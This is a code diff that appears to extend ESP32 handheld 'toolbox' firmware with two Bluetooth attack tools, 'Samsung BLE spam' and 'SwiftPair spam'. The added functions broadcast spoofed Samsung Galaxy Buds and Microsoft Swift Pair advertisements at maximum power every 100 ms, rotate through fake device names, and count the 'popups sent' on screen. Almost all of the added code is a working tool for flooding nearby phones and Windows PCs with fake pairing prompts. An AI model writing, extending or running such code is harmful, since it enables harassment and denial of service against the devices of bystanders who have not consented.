@@ -902,6 +902,182 @@ static void drawAppleSpam(TFT_eSPI& t, uint32_t now) {
 }
 
 // =============================================================================
+//  SAMSUNG BLE SPAM — fake Galaxy Buds pairing on Samsung phones
+// =============================================================================
+static uint32_t s_samsungSpamCount = 0;
+static uint32_t s_samsungSpamLastMs = 0;
+static int s_samsungDevIdx = 0;
+
+// Samsung uses a custom BLE service UUID for buds pairing
+// FD5A is Samsung's registered 16-bit UUID
+static const uint8_t SAMSUNG_DEVICES[][2] = {
+    {0x01, 0xEE},  // Galaxy Buds Pro
+    {0x01, 0xEF},  // Galaxy Buds Live
+    {0x02, 0x00},  // Galaxy Buds2
+    {0x02, 0x01},  // Galaxy Buds2 Pro
+    {0x02, 0x02},  // Galaxy Buds FE
+    {0x01, 0xF0},  // Galaxy Buds+
+};
+static const char* SAMSUNG_NAMES[] = {
+    "Galaxy Buds Pro", "Galaxy Buds Live", "Galaxy Buds2",
+    "Galaxy Buds2 Pro", "Galaxy Buds FE", "Galaxy Buds+"
+};
+static const int SAMSUNG_DEV_COUNT = 6;
+
+static void samsungSpamStart() {
+    s_samsungSpamCount = 0;
+    s_samsungSpamLastMs = 0;
+    s_samsungDevIdx = 0;
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    s_pAdv = NimBLEDevice::getAdvertising();
+    Serial.println("[toolbox] Samsung BLE spam started");
+}
+
+static void samsungSpamTick() {
+    uint32_t now = millis();
+    if (now - s_samsungSpamLastMs < 100) return;
+    s_samsungSpamLastMs = now;
+
+    s_pAdv->stop();
+
+    // Samsung manufacturer data: company ID 0x0075 (Samsung)
+    uint8_t mfgData[12];
+    mfgData[0] = 0x75; mfgData[1] = 0x00;  // Samsung company ID
+    mfgData[2] = 0x42;  // type
+    mfgData[3] = SAMSUNG_DEVICES[s_samsungDevIdx][0];
+    mfgData[4] = SAMSUNG_DEVICES[s_samsungDevIdx][1];
+    mfgData[5] = random(0, 256);
+    mfgData[6] = random(0, 256);
+    mfgData[7] = random(0, 256);
+
+    NimBLEAdvertisementData advData;
+    advData.setFlags(0x06);
+    advData.setManufacturerData(std::string((char*)mfgData, 8));
+    // Also add the Samsung FD5A service UUID
+    advData.setCompleteServices16({NimBLEUUID((uint16_t)0xFD5A)});
+
+    s_pAdv->setAdvertisementData(advData);
+    s_pAdv->start();
+
+    s_samsungDevIdx = (s_samsungDevIdx + 1) % SAMSUNG_DEV_COUNT;
+    s_samsungSpamCount++;
+}
+
+static void drawSamsungSpam(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    samsungSpamTick();
+
+    t.setTextColor(Theme::CYAN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("SAMSUNG BLE SPAM", w / 2, HEADER_H + 20, 4);
+
+    t.setTextDatum(TL_DATUM);
+    int listY = HEADER_H + 50;
+    for (int i = 0; i < SAMSUNG_DEV_COUNT; i++) {
+        uint16_t col = (i == s_samsungDevIdx) ? Theme::VAPOR_YELLOW : Theme::VAPOR_PURPLE;
+        t.setTextColor(col, Theme::BG);
+        t.drawString(SAMSUNG_NAMES[i], 12, listY + i * 22, 2);
+    }
+
+    char buf[32];
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_samsungSpamCount);
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString(buf, w / 2, h - 65, 6);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("popups sent", w / 2, h - 35, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  SWIFTPAIR SPAM — Windows Bluetooth pairing popups
+// =============================================================================
+static uint32_t s_swiftSpamCount = 0;
+static uint32_t s_swiftSpamLastMs = 0;
+
+static const char* SWIFT_NAMES[] = {
+    "Wireless Mouse", "BT Keyboard", "Xbox Controller",
+    "Surface Earbuds", "BT Speaker", "Wireless Headset"
+};
+static const int SWIFT_DEV_COUNT = 6;
+static int s_swiftDevIdx = 0;
+
+static void swiftPairStart() {
+    s_swiftSpamCount = 0;
+    s_swiftSpamLastMs = 0;
+    s_swiftDevIdx = 0;
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    s_pAdv = NimBLEDevice::getAdvertising();
+    Serial.println("[toolbox] SwiftPair spam started");
+}
+
+static void swiftPairTick() {
+    uint32_t now = millis();
+    if (now - s_swiftSpamLastMs < 100) return;
+    s_swiftSpamLastMs = now;
+
+    s_pAdv->stop();
+
+    // Microsoft Swift Pair: company ID 0x0006 (Microsoft)
+    // Beacon type 0x03 = Swift Pair
+    uint8_t mfgData[8];
+    mfgData[0] = 0x06; mfgData[1] = 0x00;  // Microsoft company ID
+    mfgData[2] = 0x03;  // Swift Pair beacon type
+    mfgData[3] = 0x00;  // scenario
+    mfgData[4] = random(0, 256);  // RSSI byte
+    mfgData[5] = random(0, 256);
+
+    NimBLEAdvertisementData advData;
+    advData.setFlags(0x06);
+    advData.setManufacturerData(std::string((char*)mfgData, 6));
+    advData.setName(SWIFT_NAMES[s_swiftDevIdx]);
+
+    s_pAdv->setAdvertisementData(advData);
+    s_pAdv->start();
+
+    s_swiftDevIdx = (s_swiftDevIdx + 1) % SWIFT_DEV_COUNT;
+    s_swiftSpamCount++;
+}
+
+static void drawSwiftPairSpam(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    swiftPairTick();
+
+    t.setTextColor(Theme::VAPOR_BLUE, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("SWIFTPAIR SPAM", w / 2, HEADER_H + 20, 4);
+
+    t.setTextDatum(TL_DATUM);
+    int listY = HEADER_H + 50;
+    for (int i = 0; i < SWIFT_DEV_COUNT; i++) {
+        uint16_t col = (i == s_swiftDevIdx) ? Theme::VAPOR_YELLOW : Theme::CYAN;
+        t.setTextColor(col, Theme::BG);
+        t.drawString(SWIFT_NAMES[i], 12, listY + i * 22, 2);
+    }
+
+    char buf[32];
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_swiftSpamCount);
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString(buf, w / 2, h - 65, 6);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("popups sent", w / 2, h - 35, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
 //  Tool stop / cleanup
 // =============================================================================
 static void stopActiveTool() {
@@ -928,6 +1104,8 @@ static void stopActiveTool() {
             if (s_pBLEScan && s_pBLEScan->isScanning()) s_pBLEScan->stop();
             break;
         case ActiveTool::APPLE_SPAM:
+        case ActiveTool::SAMSUNG_SPAM:
+        case ActiveTool::SWIFTPAIR_SPAM:
             if (s_pAdv) { s_pAdv->stop(); s_pAdv = nullptr; }
             break;
         default: break;
@@ -953,7 +1131,9 @@ static void launchTool(ActiveTool tool) {
         case ActiveTool::RICKROLL:    rickrollStart();    break;
         case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
         case ActiveTool::BLE_SCAN:    bleScanStart();     break;
-        case ActiveTool::APPLE_SPAM:  appleSpamStart();   break;
+        case ActiveTool::APPLE_SPAM:    appleSpamStart();   break;
+        case ActiveTool::SAMSUNG_SPAM:  samsungSpamStart(); break;
+        case ActiveTool::SWIFTPAIR_SPAM: swiftPairStart();  break;
         default: break;
     }
 }
@@ -1007,7 +1187,9 @@ static const char* headerForLevel(ToolboxLevel lvl) {
                 case ActiveTool::CLONE_AP:    return "CLONE AP";
                 case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                 case ActiveTool::BLE_SCAN:    return "BLE SCAN";
-                case ActiveTool::APPLE_SPAM:  return "APPLE SPAM";
+                case ActiveTool::APPLE_SPAM:    return "APPLE SPAM";
+                case ActiveTool::SAMSUNG_SPAM:  return "SAMSUNG SPAM";
+                case ActiveTool::SWIFTPAIR_SPAM: return "SWIFTPAIR";
                 default:                      return "RUNNING...";
             }
         default: return "TOOLBOX";
@@ -1254,7 +1436,9 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
             case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
             case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
             case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
-            case ActiveTool::APPLE_SPAM:  drawAppleSpam(t, now);  break;
+            case ActiveTool::APPLE_SPAM:    drawAppleSpam(t, now);      break;
+            case ActiveTool::SAMSUNG_SPAM:  drawSamsungSpam(t, now);    break;
+            case ActiveTool::SWIFTPAIR_SPAM: drawSwiftPairSpam(t, now); break;
             default:
                 t.setTextColor(Theme::CYAN, Theme::BG);
                 t.setTextDatum(MC_DATUM);
@@ -1324,7 +1508,9 @@ static bool handleBleTap(int idx) {
     if ((BleTool)idx == BleTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
     switch ((BleTool)idx) {
         case BleTool::SCAN_DEVICES: launchTool(ActiveTool::BLE_SCAN); break;
-        case BleTool::APPLE_SPAM:   launchTool(ActiveTool::APPLE_SPAM); break;
+        case BleTool::APPLE_SPAM:     launchTool(ActiveTool::APPLE_SPAM); break;
+        case BleTool::SAMSUNG_SPAM:   launchTool(ActiveTool::SAMSUNG_SPAM); break;
+        case BleTool::SWIFTPAIR_SPAM: launchTool(ActiveTool::SWIFTPAIR_SPAM); break;
         default:
             s_toolActive = true;
             s_activeTool = ActiveTool::NONE;
